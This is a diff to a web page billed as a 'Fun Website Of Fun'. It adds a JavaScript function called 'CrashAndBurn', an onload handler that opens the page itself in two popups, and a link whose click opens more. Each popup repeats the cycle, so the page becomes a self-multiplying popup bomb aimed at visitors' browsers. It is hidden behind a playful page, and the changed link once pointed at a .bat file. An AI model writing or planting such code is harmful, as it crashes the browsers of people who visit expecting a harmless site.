@@ -22,6 +22,10 @@
 	padding: 10px;
 }
 </style>
+<script type="text/javascript"> 
+function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','height=181,width=666,left=3,top=222') }
+</script> 
+<body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
 </head>
 
 <body>
@@ -42,7 +46,7 @@
 <div class="box" style="background-color: black; ">
 
 <h4>Fun Website Of Fun</h4>
-<a href="pages/error.bat">This Link</a>
+<a href="pages/error.html" onclick="JavaScript:CrashAndBurn(pages/error.html,'_blank');JavaScript:CrashAndBurn(pages/error.html,'_blank');">This Link</a>
 <p>So much fun, it's dangerous. &#128517</p>
 
 </div>
